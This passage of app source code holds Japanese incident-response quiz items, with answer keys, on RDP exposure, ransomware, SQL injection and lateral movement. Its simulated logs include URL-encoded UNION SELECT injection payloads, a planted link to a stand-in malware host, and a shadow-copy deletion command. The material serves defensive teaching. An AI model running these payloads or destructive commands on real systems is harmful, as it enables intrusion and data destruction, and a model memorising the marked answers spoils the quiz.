        '【即時】RDPポート（3389）をファイアウォールで遮断する',
        'Administratorアカウントを無効化する',
        '偽装サービス（WindowsUpdateService）を削除する',
        'リモートアクセスはVPN経由に変更する',
      ],
      relatedCommands: [
        'netstat -an | findstr :3389',
        'sc delete WindowsUpdateService',
        'net user Administrator /active:no',
        'ip access-list extended BLOCK-RDP',
        ' deny tcp any any eq 3389',
      ],
      studyReference: '警察庁「ランサムウェアの感染経路報告2024」',
    ),
  ),

  Question(
    id: 'q_real_015_2',
    type: QuestionType.decisionFlow,
    scenarioId: 's_real_015',
    prompt:
        'RDP直接公開をやめて安全なリモートアクセス環境に移行する。\n'
        '中小企業が低コストで導入できる最善の構成はどれですか？',
    logLines: [],
    choices: [
      Choice(
        id: 'a', text: 'RDPポートを3389から別のポート番号に変更する',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'ポート番号変更はShodanやNmapで簡単に発見されます。根本的な対策ではありません。',
      ),
      Choice(
        id: 'b', text: 'VPN（SSL-VPN or WireGuard）経由でのみRDPを許可 + MFA + Administratorアカウントの無効化',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ VPNで入口を絞り（VPN認証が突破されないとRDPに到達できない）、MFAで認証強化、Administratorをターゲットにしたブルートフォースを防止する三重構成が最適です。',
      ),
      Choice(
        id: 'c', text: 'ファイアウォールで特定の固定IPのみRDPを許可する',
        isCorrect: false, scoreImpact: 50,
        feedbackText: '固定IP制限は有効ですが、テレワーカーが自宅・外出先で使う場合にIPが変わるため運用困難です。',
      ),
      Choice(
        id: 'd', text: 'RDPポートを閉じてTeamViewerなどの商用リモートデスクトップに切り替える',
        isCorrect: false, scoreImpact: 50,
        feedbackText: 'TeamViewerは選択肢として有効ですが、利用規約・コスト・セキュリティポリシーの確認が必要です。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          '安全なリモートアクセスの基本構成: '
          '①VPN（WireGuardは無料・軽量・高速）でインターネットからの直接アクセスを排除'
          '②MFAでVPN認証を強化'
          '③Administratorを無効化して辞書攻撃のターゲットを排除。',
      nextActions: [
        'WireGuard VPNを社内サーバに設定（UDP 51820）',
        'FWでRDP（TCP 3389）をインターネットから遮断',
        '全管理者アカウントにMFAを設定',
        'net user Administrator /active:no でAdministratorを無効化',
      ],
      relatedCommands: [
        'wg-quick up wg0',
        'net user Administrator /active:no',
      ],
      studyReference: 'IPA「テレワークセキュリティガイドライン」',
    ),
  ),

  // ━━ s_real_020: 長期休暇中の攻撃 ━━━━━━━━━━━━━━━━━━━━━━

  Question(
    id: 'q_real_020_1',
    type: QuestionType.logChallenge,
    scenarioId: 's_real_020',
    prompt:
        'GW中（5月3日〜6日）のVPN機器アクセスログと、5月7日（連休明け）の発見ログを確認してください。',
    logLines: [
      '# GW中の未対応アラート（受信していたが確認されず）',
      'May 03 03:14:22 VPN-GW %SSL-4-ALERT: Auth bypass attempt detected',
      'May 04 02:30:11 VPN-GW %SSL-3-BREACH: Successful auth bypass',
      '  CVE-2024-XXXX src=103.87.204.44',
      'May 04〜06: 侵害者による内部偵察（検知なし・監視体制なし）',
      '',
      '# 5月7日 連休明けの発見',
      'May 07 09:05:00 FILESERVER %FS-2-CRIT: Mass encryption in progress',
      '  files_encrypted=50,000 ransomware=LockBit3',
      'May 07 09:05:30 SIEM-01 [CRITICAL] Ransomware outbreak detected',
      '  infected_hosts=23 estimated_damage=CRITICAL',
    ],
    choices: [
      Choice(
        id: 'a', text: '連休明けの業務開始でシステムに高負荷がかかった',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'GW中（5月3〜4日）のVPNへの侵害アラートが未対応のまま、4日間侵害者が内部偵察を行っていたことが問題です。',
      ),
      Choice(
        id: 'b', text: 'GW中にVPNが侵害されたが監視体制がなく発見が遅れ、連休明けにランサムウェアが実行された',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ 5月3日に最初のアラートが出ていたが誰も確認せず、4日に侵害成功。4日間の偵察を経て連休明けにランサムウェアが実行されました。',
      ),
      Choice(
        id: 'c', text: '社員が連休中に自宅から誤ってランサムウェアをダウンロードした',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'VPN機器への認証バイパス（CVE）攻撃が起点です。外部からの標的型攻撃です。',
      ),
      Choice(
        id: 'd', text: 'アンチウイルスソフトの定義ファイルが古くなりランサムウェアを検知できなかった',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'アンチウイルスの問題ではなく、VPN侵害のアラートが4日間放置されたことが根本原因です。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          '長期休暇中の攻撃パターン: 攻撃者は意図的に企業のGW・お盆・年末年始を狙う。'
          'セキュリティ担当者が不在・監視体制が手薄な時期に侵入し、'
          '連休が明けるタイミングでランサムウェアを実行する。',
      nextActions: [
        '【連休前】VPN機器・公開サーバへのパッチ適用を完了させる',
        '【連休前】SOC/MSSによる24/365監視体制を確認',
        '【連休前】インシデント時の緊急連絡先リストを更新する',
        '【連休明け】ログを遡って連休中の不審な通信がないか確認する',
      ],
      relatedCommands: [
        'show log | include GW-period',
        'show ip conn',
        'nmap -sV --script vuln [VPN-IP]',
      ],
      studyReference: 'IPA「長期休暇におけるセキュリティ対策のすすめ」',
    ),
  ),

  Question(
    id: 'q_real_020_2',
    type: QuestionType.decisionFlow,
    scenarioId: 's_real_020',
    prompt:
        '長期休暇前に必ず実施すべきセキュリティチェックとして\n'
        '優先度が最も高い組み合わせはどれですか？',
    logLines: [],
    choices: [
      Choice(
        id: 'a', text: 'PCのハードディスクのデフラグと社員への注意喚起メール',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'デフラグはセキュリティと関係ありません。攻撃経路となるVPN・公開サーバのパッチ適用が最優先です。',
      ),
      Choice(
        id: 'b', text: '公開サーバ・VPN機器のパッチ適用 + 監視アラートのエスカレーション先設定 + 不要なリモートアクセスアカウントの無効化',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ 攻撃の入口を塞ぎ（パッチ）、発生時に検知できる体制を整え（アラート設定）、不要な侵入経路を閉じる（不要アカウント無効化）の三点が最優先です。',
      ),
      Choice(
        id: 'c', text: '社内のアンチウイルスソフトを最新版に更新する',
        isCorrect: false, scoreImpact: 50,
        feedbackText: 'アンチウイルス更新は有効ですが、VPN侵害はアンチウイルスでは検知できません。入口の脆弱性対策が先です。',
      ),
      Choice(
        id: 'd', text: 'サーバを全て休暇中はシャットダウンする',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'サーバをシャットダウンすれば外部公開サービスも停止します。業務継続の観点から現実的ではありません。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          '長期休暇前のセキュリティチェックリスト（優先順）: '
          '①VPN・公開Webサーバへのパッチ適用（最重要・入口の閉鎖）'
          '②SIEMアラートのエスカレーション先をオンコール担当者に設定'
          '③退職者・プロジェクト終了した外部委託者のVPNアカウント無効化。',
      nextActions: [
        '休暇前: CVSSスコア9.0以上の脆弱性を優先してパッチ適用',
        '休暇前: SIEMの緊急アラートを担当者の携帯に転送設定',
        '休暇前: 不要なVPNアカウントを一括無効化',
        '休暇明け: 連休中のログを必ず遡って確認する',
      ],
      relatedCommands: [
        'show users',
        'Get-ADUser -Filter {Enabled -eq \$True} -Properties LastLogonDate',
      ],
      studyReference: 'IPA「長期休暇前後のセキュリティ対策」2024年版',
    ),
  ),

  // ━━ s_real_003: サプライチェーン攻撃（委託先ランサムウェア→保険会社顧客データ漏洩） ━━

  Question(
    id: 'q_real_003_1',
    type: QuestionType.logChallenge,
    scenarioId: 's_real_003',
    prompt: '以下は委託先会計事務所のSIEMログ抜粋です。何が発生しているか選んでください。',
    logLines: [
      'Mar 14 02:11:08 ACCT-SV01 %AV-3-RANSOMWARE: Suspicious encrypt process detected',
      '  Process: svchost.exe (PID 4821), Target: D:\\ClientData\\*',
      'Mar 14 02:11:09 ACCT-SV01 %FS-4-MASSMOD: 3842 files modified in <30s',
      '  Extensions renamed to: .locked',
      'Mar 14 02:11:11 ACCT-SV01 %NET-4-BEACONING: C2 callback detected',
      '  dst=185.220.101.47:443 (TOR exit node)',
      'Mar 14 02:12:04 ACCT-SV01 %FS-3-SHADOW_DEL: VSS shadow copies deleted',
      '  cmd: vssadmin delete shadows /all /quiet',
    ],
    choices: [
      Choice(
        id: 'a', text: '会計事務所サーバでランサムウェアが実行され、クライアントデータが暗号化されている',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ 短時間での大量ファイル変名（.locked）・VSS削除・C2通信はランサムウェア感染の典型的な兆候です。委託元の顧客データにも影響が及ぶ可能性があります。',
      ),
      Choice(
        id: 'b', text: 'バックアップ処理が誤ってファイルを上書きしている',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'バックアップ処理はC2コールバックやVSS削除を行いません。ランサムウェアの典型的なTTP（戦術・技法・手順）です。',
      ),
      Choice(
        id: 'c', text: '内部社員がデータを不正に圧縮して持ち出している',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '内部持ち出しならファイル名変更は伴いません。%FS-4-MASSMODと拡張子.lockedへの変名はランサムウェアの暗号化を示しています。',
      ),
      Choice(
        id: 'd', text: 'ストレージの障害でファイルシステムが破損している',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'ストレージ障害なら%FS-3-IO_ERRORやSMARTアラートが出ます。C2通信（TOR経由）とVSS削除は攻撃者の意図的な行動です。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          '委託先の会計事務所がランサムウェアに感染。攻撃者はまずC2サーバに接続して指令を受け、'
          '30秒以内に3,842件のファイルを暗号化（.locked）し、復旧を妨げるためVSSシャドウコピーを削除した。'
          '委託先サーバには委託元の生命保険会社の顧客データが保存されており、サプライチェーン経由の情報漏洩に発展した。',
      nextActions: [
        '委託元として委託先の感染状況と保存データの範囲を即時確認する',
        '委託先ネットワークと委託元ネットワーク間の接続を遮断する',
        '漏洩対象の顧客データ件数・内容を特定し、個人情報保護委員会へ報告義務を確認',
        '影響顧客への通知と相談窓口の設置を準備する',
        '委託先との契約・セキュリティ要件（ISMS等）を見直す',
      ],
      relatedCommands: [
        'netstat -an | grep ESTABLISHED  （感染端末の通信先確認）',
        'Get-WinEvent -LogName Security | Where {\$_.Id -eq 4663}  （ファイルアクセス監査）',
        'vssadmin list shadows  （VSS残存確認）',
        'wmic shadowcopy list  （シャドウコピー確認）',
      ],
      studyReference: 'IPA「委託先管理とサプライチェーンリスク対策」・個人情報保護法72条（漏洩報告義務）',
    ),
  ),

  Question(
    id: 'q_real_003_2',
    type: QuestionType.decisionFlow,
    scenarioId: 's_real_003',
    prompt:
        '委託先の会計事務所がランサムウェア感染し、自社顧客データが漏洩した可能性が判明した。\n'
        '保険会社のセキュリティ担当者として、最初にとるべき行動はどれですか？',
    logLines: [],
    choices: [
      Choice(
        id: 'a', text: '委託先へのネットワーク接続を即時遮断し、漏洩範囲の特定を開始する',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ 被害拡大防止のために委託先との接続を切り、自社システムへの侵害がないか並行して確認するのが正しい初動です。',
      ),
      Choice(
        id: 'b', text: '委託先が復旧するまで待ってから状況を確認する',
        isCorrect: false, scoreImpact: -50,
        feedbackText: '待機は被害を拡大させます。個人情報保護法では漏洩を知った時点から速やかな対応が求められます。受動的な待機は法的・倫理的に不適切です。',
      ),
      Choice(
        id: 'c', text: 'まず個人情報保護委員会に報告してから社内対応を開始する',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '報告は重要ですが、まず被害拡大防止と漏洩範囲の特定が先です。報告に必要な情報（件数・内容）を把握してから行うのが適切な順序です。',
      ),
      Choice(
        id: 'd', text: '委託先のセキュリティ体制を問う書面を送付し、回答を待つ',
        isCorrect: false, scoreImpact: -50,
        feedbackText: '書面のやり取りは事後対応です。インシデント発生中は即時の電話・緊急連絡で状況を把握し、技術的な遮断措置を最優先にします。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          'サプライチェーン攻撃では委託先が侵害の起点となる。委託元は自社データの安全を確保するため、'
          '①委託先との通信遮断 → ②自社環境への侵害確認 → ③漏洩範囲の特定 → ④当局・顧客への報告 の順で対応する。'
          '個人情報保護法の改正（2022年）により、1,000件以上または要配慮個人情報の漏洩は委員会への報告が義務化されている。',
      nextActions: [
        '委託先との専用ネットワーク・VPN接続を即時遮断',
        '自社SIEMで委託先IPからの不審アクセスがないか遡及調査（過去30日）',
        '委託先に保存していたデータの種別・件数を洗い出す',
        '法務・経営層へのエスカレーションと個人情報保護委員会報告の準備',
        '影響を受ける顧客リストを作成し、通知文・相談窓口を準備',
      ],
      relatedCommands: [
        'firewall-cmd --remove-source=<委託先IP>/32  （接続遮断）',
        'grep <委託先IP> /var/log/syslog | tail -1000  （ログ確認）',
      ],
      studyReference: '個人情報保護法第26条（漏洩等の報告）・IPA「サプライチェーンリスク対策」',
    ),
  ),

  // ━━ s_real_007: SQLインジェクション（医薬品WebサイトDB改ざん） ━━━━━━━━━━━━

  Question(
    id: 'q_real_007_1',
    type: QuestionType.logChallenge,
    scenarioId: 's_real_007',
    prompt: '以下はWebアプリのアクセスログとDBエラーログです。何が起きているか選んでください。',
    logLines: [
      '192.168.0.200 - - [09/Feb/2024:03:22:41] "GET /search?drug=aspirin%27%20UNION',
      '  %20SELECT%201%2C%20table_name%2C%203%20FROM%20information_schema.tables--',
      '  HTTP/1.1" 200 4821',
      '192.168.0.200 - - [09/Feb/2024:03:22:44] "GET /search?drug=aspirin%27%20UNION',
      '  %20SELECT%201%2C%20column_name%2C%203%20FROM%20information_schema.columns',
      '  %20WHERE%20table_name%3D%27articles%27-- HTTP/1.1" 200 2341',
      '192.168.0.200 - - [09/Feb/2024:03:23:01] "POST /admin/update HTTP/1.1" 200 142',
      '  body: id=15&content=<a href="http://malware-dl.example.com">続きはこちら</a>',
    ],
    choices: [
      Choice(
        id: 'a', text: 'SQLインジェクションでDBのテーブル構造を調査後、記事コンテンツに悪意のある外部リンクを挿入した',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ UNION SELECTでテーブル・カラム名を列挙（情報収集）し、その後POSTで記事を悪意のあるリンクに書き換えています。DB改ざんの典型的な手口です。',
      ),
      Choice(
        id: 'b', text: 'XSS攻撃によりユーザーのCookieが盗まれた',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'XSSはHTMLを注入する攻撃ですが、このログではSQLのUNION SELECT（SQLi）でDB構造を列挙しています。Cookie窃取の証拠もありません。',
      ),
      Choice(
        id: 'c', text: 'ブルートフォース攻撃で管理者パスワードが解析された',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'ブルートフォースなら同一パスに対する大量のPOSTログが並びます。このログはSQLインジェクションによるDB探索を示しています。',
      ),
      Choice(
        id: 'd', text: 'クローラーが大量リクエストを送信してサーバを過負荷にした',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'クローラーはGETリクエストを繰り返しますが、UNION SELECT句を含むクエリや管理者エンドポイントへのPOSTは攻撃の特徴です。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          '攻撃者はGETパラメータにSQLインジェクションを仕込み、UNION SELECTでinformation_schemaから'
          'テーブル名・カラム名を収集した。その後、管理者更新APIに直接POSTして記事本文を'
          'マルウェア配布サイトへのリンクに書き換えた（Stored XSSとDB改ざんの複合攻撃）。',
      nextActions: [
        '改ざんされたレコードをDBから特定し、正規コンテンツに戻す',
        'Webアプリをオフラインにして被害範囲を確認する',
        'プリペアドステートメント（バインド変数）を使うよう全クエリを修正する',
        'WAFにSQLインジェクション検出ルールを適用する',
        '攻撃元IPをACL・WAFでブロックし、同一手法の再試行を防ぐ',
      ],
      relatedCommands: [
        'SELECT * FROM articles WHERE id = 15;  （改ざんレコード確認）',
        'grep "UNION%20SELECT" /var/log/apache2/access.log  （SQLi痕跡検索）',
        'mysqlbinlog --start-datetime="2024-02-09 03:00:00" /var/log/mysql/bin.log',
      ],
      studyReference: 'OWASP Top 10: A03 Injection / IPA「安全なウェブサイトの作り方」',
    ),
  ),

  Question(
    id: 'q_real_007_2',
    type: QuestionType.decisionFlow,
    scenarioId: 's_real_007',
    prompt:
        '医薬品情報Webサイトで、記事コンテンツが悪意のある外部リンクに書き換えられているのを発見した。\n'
        '最初に行うべき対応はどれですか？',
    logLines: [],
    choices: [
      Choice(
        id: 'a', text: 'サイトを直ちに非公開（メンテナンスモード）にしてから被害範囲を調査する',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ 改ざんされたサイトを公開し続けると利用者がマルウェアに誘導されます。まず非公開にして被害を止め、その後に調査・修復を行います。',
      ),
      Choice(
        id: 'b', text: '改ざんされたリンクだけを削除してサービスを継続する',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '表面的な修正だけでは不十分です。SQLインジェクションの脆弱性が残ったまま公開を続けると再攻撃されます。根本原因の修正が必要です。',
      ),
      Choice(
        id: 'c', text: 'WAFを導入してから調査を開始する',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'WAF導入は重要ですが、まずサイトを非公開にして利用者被害を止めることが優先です。WAF設定に時間をかけている間も被害が続きます。',
      ),
      Choice(
        id: 'd', text: '攻撃元IPをファイアウォールでブロックしてサービスを継続する',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'IP単体のブロックは攻撃者がIPを変えれば無効です。また脆弱性自体が残るため、他の攻撃者から同じ手法で攻撃される可能性があります。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          'Webサイト改ざんの対応優先順位: '
          '①サイト非公開（利用者被害防止） → ②ログ保全（証拠保全） → ③攻撃経路の特定（SQLiのパラメータ特定） → '
          '④DB内の改ざん範囲確認・修復 → ⑤脆弱性修正（プリペアドステートメント化） → ⑥WAF適用 → ⑦再公開。',
      nextActions: [
        'サイトをメンテナンスモードに切り替えて一般公開を停止',
        'Webサーバ・DBのアクセスログを保全（削除・上書き防止）',
        'SQLインジェクションのパラメータを特定しDBの全改ざん箇所を洗い出す',
        'プリペアドステートメントに書き直し、WAFルールを適用してから再公開',
        '利用者・JPCERT/CCへの報告を準備する',
      ],
      relatedCommands: [
        'cp -rp /var/log/apache2 /backup/incident-logs/  （ログ保全）',
        'grep -i "UNION|SELECT|information_schema" /var/log/apache2/access.log',
        'SELECT * FROM articles WHERE content LIKE "%malware%";',
      ],
      studyReference: 'IPA「ウェブサイト改ざん対応 チェックリスト」/ OWASP SQL Injection Prevention Cheat Sheet',
    ),
  ),

  // ━━ s_real_008: ランサムウェア＋バックアップ同時破壊（食品製造会社） ━━━━━━━━━

  Question(
    id: 'q_real_008_1',
    type: QuestionType.logChallenge,
    scenarioId: 's_real_008',
    prompt: '以下はバックアップサーバと本番サーバのログです。状況を正しく説明しているものはどれですか？',
    logLines: [
      'Nov 02 01:44:17 PROD-SV01 %CRYPTO-3-RANSOMWARE: Mass encryption started',
      '  Target: E:\\Production\\*, F:\\Shared\\*  Files: 28441',
      'Nov 02 01:44:19 PROD-SV01 %FS-3-SHADOW_DEL: VSS deleted via wmic',
      'Nov 02 01:44:23 BACKUP-SV01 %SMB-4-WRITE: Unusual write from 10.10.0.21',
      '  Path: \\\\BACKUP-SV01\\Archives\\*.bak → renamed to *.bak.locked',
      'Nov 02 01:44:31 BACKUP-SV01 %CRYPTO-3-RANSOMWARE: Mass encryption started',
      '  Target: G:\\Archives\\*  Files: 91233',
      'Nov 02 01:44:45 BACKUP-SV01 %FS-3-SHADOW_DEL: VSS deleted',
    ],
    choices: [
      Choice(
        id: 'a', text: '本番サーバのみがランサムウェアに感染し、バックアップからの復旧が可能な状態だ',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'バックアップサーバ（BACKUP-SV01）でも同じタイミングで暗号化が発生しています。本番・バックアップが同時に暗号化されており、通常の復旧はできません。',
      ),
      Choice(
        id: 'b', text: 'ランサムウェアが本番・バックアップサーバ両方を暗号化し、VSS（シャドウコピー）も削除された',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ 本番（28,441件）とバックアップ（91,233件）が同時に暗号化され、両サーバのVSSも削除されています。これは二重破壊型ランサムウェアの典型的な手口です。',
      ),
      Choice(
        id: 'c', text: 'バックアップサーバからのリストア処理中にファイルが破損した',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'リストア処理では%CRYPTO-3-RANSOMWAREのアラートは発生しません。外部IPからのSMB書き込み後に暗号化が起きており、攻撃の侵害パスが明確です。',
      ),
      Choice(
        id: 'd', text: 'ストレージのRAID障害でデータが失われた',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'RAID障害ならディスクエラーログが出ます。%CRYPTO-3-RANSOMWAREとVSS削除はランサムウェアによる意図的な暗号化を示しています。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          '攻撃者は本番サーバ（10.10.0.21）に侵入後、SMBでバックアップサーバにアクセスし、'
          '本番・バックアップを同時に暗号化した。VSSのシャドウコピーも削除されたため、'
          '通常のオンプレバックアップでは復旧が不可能な状態。オフライン・オフサイトのバックアップが唯一の復旧手段となった。',
      nextActions: [
        '感染端末を即時ネットワークから隔離（物理ケーブル抜去）',
        'オフラインバックアップ（テープ・エアギャップ）の存在と最終取得日を確認',
        'インシデントレスポンスチームを招集し、感染経路の調査を開始',
        '業務継続計画（BCP）に基づいて代替業務フローに切り替える',
        '警察庁サイバー部門・JPCERT/CCに報告する',
      ],
      relatedCommands: [
        'Get-WinEvent -LogName Security -Id 4624 | Where {\$_.TimeCreated -gt "2024-11-02 01:00"}',
        'netstat -ano | findstr ESTABLISHED  （侵入元の通信確認）',
        'wbadmin get versions  （Windowsバックアップバージョン確認）',
      ],
      studyReference: 'IPA「ランサムウェア対策特設ページ」/ 3-2-1バックアップルール（オフサイト・オフライン）',
    ),
  ),

  Question(
    id: 'q_real_008_2',
    type: QuestionType.decisionFlow,
    scenarioId: 's_real_008',
    prompt:
        '本番・バックアップサーバ両方がランサムウェアに感染し、VSS（シャドウコピー）も削除された。\n'
        'この状況で最優先に確認すべきことはどれですか？',
    logLines: [],
    choices: [
      Choice(
        id: 'a', text: 'オフライン・エアギャップ環境のバックアップが存在するか確認する',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ ネットワーク接続されたバックアップは同時暗号化されています。テープや物理的に切り離されたオフラインバックアップだけが復旧の手段となるため、最優先で確認します。',
      ),
      Choice(
        id: 'b', text: '攻撃者に身代金を支払ってキーを受け取る',
        isCorrect: false, scoreImpact: -50,
        feedbackText: '身代金を支払っても復号キーが提供される保証はありません。また支払いは攻撃者への資金供与となり、次の攻撃を助長します。警察への相談なしに支払いを決めるべきではありません。',
      ),
      Choice(
        id: 'c', text: '感染サーバをその場で再起動して暗号化プロセスを止める',
        isCorrect: false, scoreImpact: -50,
        feedbackText: '再起動ではランサムウェアが止まらない場合があります。さらに再起動前に揮発性メモリの証拠（プロセス・通信先等）が失われ、フォレンジック調査が困難になります。',
      ),
      Choice(
        id: 'd', text: 'まずIT部門全員にメールで状況を通知する',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '状況共有は必要ですが、メール通知より先にバックアップの存在確認と感染拡大防止（ネットワーク遮断）を実施します。メール送信中も暗号化が継続します。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          'バックアップも同時破壊された場合の対応優先順位: '
          '①感染端末のネットワーク遮断（拡大防止） → ②オフラインバックアップの存在確認 → '
          '③感染経路・範囲の特定 → ④警察・JPCERT/CC報告 → ⑤復旧計画の策定。'
          '3-2-1ルール（3コピー・2媒体・1オフサイト）の実践がランサムウェアへの最大の備えとなる。',
      nextActions: [
        '全感染端末のLANケーブルを抜きネットワークを物理遮断する',
        'テープバックアップや外部保管媒体の保管場所と最終取得日を確認',
        'クリーンな代替環境でオフラインバックアップからのリストアを試行',
        '警察庁サイバー局に相談し、身代金支払いの可否についても意見を求める',
        '再発防止策として3-2-1バックアップ体制の構築計画を立案する',
      ],
      relatedCommands: [
        'wbadmin get versions -backupTarget:\\\\OFFLINE-SV\\Backup',
        'robocopy /MIR /XO /LOG:restore.log \\\\OFFLINE\\Backup C:\\Restored',
      ],
      studyReference: 'IPA「ランサムウェア被害防止対策ガイド」/ NIST CSF: RC.RP（復旧計画）',
    ),
  ),

  // ━━ s_real_010: 海外子会社経由のラテラルムーブメント ━━━━━━━━━━━━━━━━

  Question(
    id: 'q_real_010_1',
    type: QuestionType.logChallenge,
    scenarioId: 's_real_010',
    prompt: '以下はSIEMアラートとVPNゲートウェイのログです。何が起きているか選んでください。',
    logLines: [
      'Dec 03 08:12:44 SIEM %ALERT-4-LATERAL: Suspicious SMB lateral movement',
      '  src=172.16.50.22 (oversea-subsidiary), dst=192.168.0.0/16 (HQ)',
      'Dec 03 08:13:01 VPN-GW %VPN-4-AUTHOK: Session established',
      '  user=svc_backup@subsidiary, src=172.16.50.22, dst=192.168.1.10 (HQ-FILESVR)',
      'Dec 03 08:13:18 HQ-FILESVR %SEC-3-ADMIN_LOGIN: Admin login from unusual IP',
      '  IP=172.16.50.22, Account=Administrator',
      'Dec 03 08:14:02 HQ-FILESVR %FS-4-MASSREAD: Bulk file access detected',
      '  Files: 15234 read in 44s, Path: \\\\HQ-FILESVR\\Finance\\*',
    ],
    choices: [
      Choice(
        id: 'a', text: 'バックアップサービスアカウントが定期的なファイル同期を実行している',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'バックアップ処理ならSIEMのLATERALアラートは発生しません。また44秒で15,234件を読み取るのはバックアップではなく、データ窃取の速度です。',
      ),
      Choice(
        id: 'b', text: '海外子会社の感染端末がVPN経由で本社ファイルサーバに侵害を拡大している',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ 海外拠点（172.16.50.22）からVPN認証後に本社管理者アカウントでログインし、財務ファイルを44秒で15,234件読み取っています。ラテラルムーブメントの典型です。',
      ),
      Choice(
        id: 'c', text: '本社と海外子会社でIPアドレスが重複している通信障害が発生している',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'IP重複なら通信断が起きますが、ここではVPN認証成功とファイルアクセスが記録されています。攻撃者が正規の認証情報を使って侵害していることを示しています。',
      ),
      Choice(
        id: 'd', text: '海外子会社の社員が業務でファイルを大量コピーしている',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'SIEMのLATERAL MOVEMENTアラートと%SEC-3-ADMIN_LOGINはセキュリティ上の異常を示します。通常業務なら管理者アカウントでのログインや大量一括読み取りはしません。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          '海外子会社の端末（172.16.50.22）がランサムウェアに感染。攻撃者は子会社の認証情報（svc_backup）を使い、'
          '本社VPNに接続して侵害を横展開（ラテラルムーブメント）させた。'
          '財務データ15,234件を短時間で読み取っており、情報窃取または暗号化の前段階と考えられる。',
      nextActions: [
        '海外子会社と本社間のVPN接続を即時遮断する',
        '侵害されたサービスアカウント（svc_backup）を無効化しパスワードをリセットする',
        'HQ-FILESVRへのアクセスログを保全し、読み取られたファイルリストを確認する',
        '本社ネットワーク内の他端末への横展開がないかSIEMで全体確認する',
        '海外子会社全端末のEDRスキャンを実施する',
      ],
      relatedCommands: [
        'Get-ADUser svc_backup | Disable-ADAccount  （アカウント無効化）',
        'Get-WinEvent -ComputerName HQ-FILESVR -LogName Security -Id 4663',
        'netstat -ano | findstr 172.16.50.22  （通信確認）',
      ],
      studyReference: 'MITRE ATT&CK: T1021.002 (SMB/Windows Admin Shares) / T1078 (Valid Accounts)',
    ),
  ),

  Question(
    id: 'q_real_010_2',
    type: QuestionType.decisionFlow,
    scenarioId: 's_real_010',
    prompt:
        '海外子会社のランサムウェア感染が判明し、本社VPNへの不審アクセスが検知された。\n'
        '本社のセキュリティ担当者として、最初に行うべき対応はどれですか？',
    logLines: [],
    choices: [
      Choice(
        id: 'a', text: '海外子会社向けのVPN接続を即時停止し、本社内の横展開を確認する',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ VPN経由の侵害経路を遮断することが最優先です。その後、本社内で侵害が広がっていないかをSIEMで確認します。',
      ),
      Choice(
        id: 'b', text: '海外子会社のIT担当者に連絡して復旧を依頼してから対応する',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '子会社への連絡は必要ですが、その間も本社への侵害は進行します。まず本社側でVPNを遮断してから連絡します。',
      ),
      Choice(
        id: 'c', text: '本社の全システムをシャットダウンして感染を防ぐ',
        isCorrect: false, scoreImpact: -50,
        feedbackText: '全システム停止は業務を完全停止させます。VPN接続の選択的遮断で被害を最小化できます。全停止は最後の手段です。',
      ),
      Choice(
        id: 'd', text: '海外子会社のネットワーク状況を監視しながら本社の様子を見る',
        isCorrect: false, scoreImpact: -50,
        feedbackText: '監視だけでは侵害拡大を止められません。ラテラルムーブメントは分単位で広がるため、即時遮断が必要です。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          'グループ企業間VPN接続はラテラルムーブメントの経路になりやすい。'
          '対応優先順位: ①侵害経路（VPN）の遮断 → ②侵害済み認証情報の無効化 → '
          '③本社内の横展開確認 → ④海外子会社の対応支援 → ⑤全体の復旧計画。'
          'ゼロトラストアーキテクチャの導入で拠点間の過剰な信頼関係を排除することが再発防止につながる。',
      nextActions: [
        '海外子会社セグメントへのVPNルールをファイアウォールで無効化',
        '侵害アカウント（svc_backup, Administrator）を全ドメインで無効化',
        'SIEMで本社内の横展開（SMB・WMI・PSExec）を過去24時間で確認',
        '海外子会社に感染端末の隔離と全端末スキャンを指示',
        'EDRの検疫機能で本社内の不審プロセスを停止する',
      ],
      relatedCommands: [
        'iptables -I FORWARD -s 172.16.50.0/24 -j DROP  （VPNルート遮断）',
        'Get-ADUser -Filter * | Where {\$_.Description -match "service"} | Disable-ADAccount',
      ],
      studyReference: 'MITRE ATT&CK: T1199 (Trusted Relationship) / ゼロトラストネットワークアーキテクチャ（NIST SP 800-207）',
    ),
  ),

